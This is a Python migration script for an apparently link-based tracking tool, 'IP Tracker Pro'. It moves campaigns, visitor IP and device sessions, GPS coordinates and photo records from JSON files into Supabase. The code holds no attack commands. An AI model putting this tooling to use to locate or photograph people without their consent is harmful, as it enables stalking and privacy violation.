#!/usr/bin/env python3
"""
Migration script: Move data from file-based storage to Supabase
Usage: python migrate_to_supabase.py
"""

import json
import os
import sys
from pathlib import Path
from datetime import datetime
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

try:
    from supabase import create_client, Client
except ImportError:
    print("❌ Error: supabase-py not installed")
    print("   Run: pip install supabase")
    sys.exit(1)

# Initialize Supabase
SUPABASE_URL = os.getenv('SUPABASE_URL')
SUPABASE_KEY = os.getenv('SUPABASE_KEY')

if not SUPABASE_URL or not SUPABASE_KEY:
    print("❌ Error: SUPABASE_URL or SUPABASE_KEY not set in .env")
    sys.exit(1)

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

DATA_DIR = Path('data/results')
CAMPAIGNS_DIR = Path('data/campaigns')

def migrate_campaigns():
    """Migrate campaign configurations"""
    print("🔄 Migrating campaigns...")
    
    campaign_files = CAMPAIGNS_DIR.glob('*.json')
    migrated = 0
    
    for campaign_file in campaign_files:
        try:
            with open(campaign_file, 'r') as f:
                campaign_data = json.load(f)
            
            # Transform for Supabase
            record = {
                'campaign_id': campaign_data.get('id'),
                'secret': campaign_data.get('secret'),
                'level': campaign_data.get('level'),
                'title': campaign_data.get('title'),
                'redirect_url': campaign_data.get('redirect', ''),
                'message': campaign_data.get('message'),
                'created_at': campaign_data.get('created_at', datetime.utcnow().isoformat())
            }
            
            # Insert into Supabase
            response = supabase.table('campaigns').insert(record).execute()
            
            if response.data:
                print(f"   ✓ Migrated campaign: {campaign_data.get('id')[:8]}...")
                migrated += 1
            else:
                print(f"   ✗ Failed to migrate campaign: {campaign_file.name}")
        
        except Exception as e:
            print(f"   ✗ Error migrating {campaign_file.name}: {e}")
    
    print(f"✅ Migrated {migrated} campaigns\n")
    return migrated

def migrate_sessions():
    """Migrate session data (IP & device info)"""
    print("🔄 Migrating sessions...")
    
    session_files = DATA_DIR.glob('*_ip.json')
    migrated = 0
    
    for session_file in session_files:
        try:
            with open(session_file, 'r') as f:
                session_data = json.load(f)
            
            # Transform for Supabase
            record = {
                'session_id': session_data.get('session_id'),
                'campaign_id': session_data.get('campaign_id'),
                'ip_address': session_data.get('ip_address'),
                'device': session_data.get('device'),
                'browser': session_data.get('browser'),
                'os': session_data.get('os'),
                'user_agent': session_data.get('user_agent'),
                'referer': session_data.get('referer'),
                'accept_language': session_data.get('accept_language'),
                'x_forwarded_for': session_data.get('x_forwarded_for', ''),
                'is_forwarded': session_data.get('is_forwarded', False),
                'timestamp': session_data.get('timestamp', datetime.utcnow().isoformat())
            }
            
            # Insert into Supabase
            response = supabase.table('sessions').insert(record).execute()
            
            if response.data:
                print(f"   ✓ Migrated session: {session_data.get('session_id')[:8]}...")
                migrated += 1
            else:
                print(f"   ✗ Failed to migrate session: {session_file.name}")
        
        except Exception as e:
            print(f"   ✗ Error migrating {session_file.name}: {e}")
    
    print(f"✅ Migrated {migrated} sessions\n")
    return migrated

def migrate_gps():
    """Migrate GPS data"""
    print("🔄 Migrating GPS data...")
    
    gps_files = DATA_DIR.glob('*_gps.json')
    migrated = 0
    
    for gps_file in gps_files:
        try:
            with open(gps_file, 'r') as f:
                gps_data = json.load(f)
            
            record = {
                'session_id': gps_data.get('session_id'),
                'latitude': gps_data.get('latitude'),
                'longitude': gps_data.get('longitude'),
                'accuracy': gps_data.get('accuracy'),
                'timestamp': gps_data.get('timestamp', datetime.utcnow().isoformat())
            }
            
            response = supabase.table('gps_data').insert(record).execute()
            
            if response.data:
                print(f"   ✓ Migrated GPS data: {gps_data.get('session_id')[:8]}...")
                migrated += 1
            else:
                print(f"   ✗ Failed to migrate GPS data: {gps_file.name}")
        
        except Exception as e:
            print(f"   ✗ Error migrating {gps_file.name}: {e}")
    
    print(f"✅ Migrated {migrated} GPS records\n")
    return migrated

def migrate_photos():
    """Migrate photo references"""
    print("🔄 Migrating photos...")
    
    photo_files = DATA_DIR.glob('*_photos.json')
    migrated = 0
    
    for photo_file in photo_files:
        try:
            with open(photo_file, 'r') as f:
                photo_data = json.load(f)
            
            session_id = photo_data.get('session_id')
            photos = photo_data.get('photos', [])
            
            for idx, photo_name in enumerate(photos, 1):
                record = {
                    'session_id': session_id,
                    'photo_number': idx,
                    'photo_url': f"Local: {photo_data.get('directory', 'Unknown')}/{photo_name}",
                    'timestamp': photo_data.get('timestamp', datetime.utcnow().isoformat())
                }
                
                response = supabase.table('photos').insert(record).execute()
                
                if response.data:
                    migrated += 1
            
            print(f"   ✓ Migrated {len(photos)} photos from session: {session_id[:8]}...")
        
        except Exception as e:
            print(f"   ✗ Error migrating {photo_file.name}: {e}")
    
    print(f"✅ Migrated {migrated} photo records\n")
    return migrated

def main():
    """Run all migrations"""
    print("=" * 60)
    print("🚀 IP Tracker Pro - File to Supabase Migration")
    print("=" * 60)
    print()
    
    # Check if data directories exist
    if not DATA_DIR.exists():
        print("⚠️  No data directory found. Nothing to migrate.")
        return
    
    try:
        # Test Supabase connection
        print("🔗 Testing Supabase connection...")
        response = supabase.table('campaigns').select('count', count='exact').limit(1).execute()
        print("✅ Connected to Supabase\n")
        
        # Run migrations
        total = 0
        total += migrate_campaigns()
        total += migrate_sessions()
        total += migrate_gps()
        total += migrate_photos()
        
        print("=" * 60)
        print(f"✅ Migration complete! ({total} records migrated)")
        print("=" * 60)
        print()
        print("📝 Next steps:")
        print("   1. Verify data in Supabase dashboard")
        print("   2. Switch to new app.py: cp app_supabase.py app.py")
        print("   3. Test the application")
        print("   4. Backup old data/results/ directory")
        print()
    
    except Exception as e:
        print(f"❌ Error during migration: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
